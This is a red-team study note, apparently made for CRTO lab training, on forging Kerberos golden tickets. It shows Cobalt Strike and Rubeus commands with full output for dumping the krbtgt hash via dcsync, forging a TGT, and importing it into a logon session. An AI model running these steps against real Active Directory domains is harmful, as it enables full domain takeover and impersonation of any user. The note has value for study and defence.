
A "golden ticket" is a forged TGT, signed by the domain's krbtgt account. The underlying credentials are never changed automatically. 

####  📗 Difference Between Silver and Golden

A silver ticket can be used to impersonate any user, but it's limited to either that single service or to any service but on a single machine.

A golden ticket can be used to impersonate any user, to any service, on any machine in the domain.

The krbtgt NTLM/AES hash is probably the single most powerful secret you can obtain (and is why you see it used in [[dcsync]] examples so frequently).

#### 🖊️ via Cobalt Strike

1) A common method for obtaining the krbtgt hash is to use dcsync from the context of a domain admin.

```
beacon> dcsync dev.cyberbotic.io DEV\krbtgt

* Primary:Kerberos-Newer-Keys *
    Default Salt : DEV.CYBERBOTIC.IOkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 51d7f328ade26e9f785fd7eee191265ebc87c01a4790a7f38fb52e06563d4e7e
      aes128_hmac       (4096) : 6fb62ed56c7de778ca5e4fe6da6d3aca
      des_cbc_md5       (4096) : 629189372a372fda
```

2) The ticket can be forged offline using Rubeus.

```
PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /aes256:51d7f328ade26e9f785fd7eee191265ebc87c01a4790a7f38fb52e06563d4e7e /user:nlamb /domain:dev.cyberbotic.io /sid:S-1-5-21-569305411-121244042-2357301523 /nowrap

[*] Action: Build TGT

[*] Building PAC

[*] Domain         : DEV.CYBERBOTIC.IO (DEV)
[*] SID            : S-1-5-21-569305411-121244042-2357301523
[*] UserId         : 500
[*] Groups         : 520,512,513,519,518
[*] ServiceKey     : 51D7F328ADE26E9F785FD7EEE191265EBC87C01A4790A7F38FB52E06563D4E7E
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_SHA1_96_AES256
[*] KDCKey         : 51D7F328ADE26E9F785FD7EEE191265EBC87C01A4790A7F38FB52E06563D4E7E
[*] KDCKeyType     : KERB_CHECKSUM_HMAC_SHA1_96_AES256
[*] Service        : krbtgt
[*] Target         : dev.cyberbotic.io

[*] Generating EncTicketPart
[*] Signing PAC
[*] Encrypting EncTicketPart
[*] Generating Ticket
[*] Generated KERB-CRED
[*] Forged a TGT for 'nlamb@dev.cyberbotic.io'

[*] AuthTime       : 9/9/2022 11:16:23 AM
[*] StartTime      : 9/9/2022 11:16:23 AM
[*] EndTime        : 9/9/2022 9:16:23 PM
[*] RenewTill      : 9/16/2022 11:16:23 AM

[*] base64(ticket.kirbi):

     doIFLz[...]MuaW8=
```


3) And then imported into a logon session to use.

`beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFLz[...snip...]MuaW8=`
```
[*] Using DEV\nlamb:FakePass

[*] Showing process : False
[*] Username        : nlamb
[*] Domain          : DEV
[*] Password        : FakePass
[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 5060
[+] Ticket successfully imported!
[+] LUID            : 0x449047

beacon> steal_token 5060
beacon> run klist

#0>	Client: nlamb @ DEV.CYBERBOTIC.IO
	Server: krbtgt/dev.cyberbotic.io @ DEV.CYBERBOTIC.IO
	KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
```




#### ⚠ Opsec




### Properties
---
📆 created   {{25-02-2024}} 13:46
🏷️ tags: #redteam #crto 

---

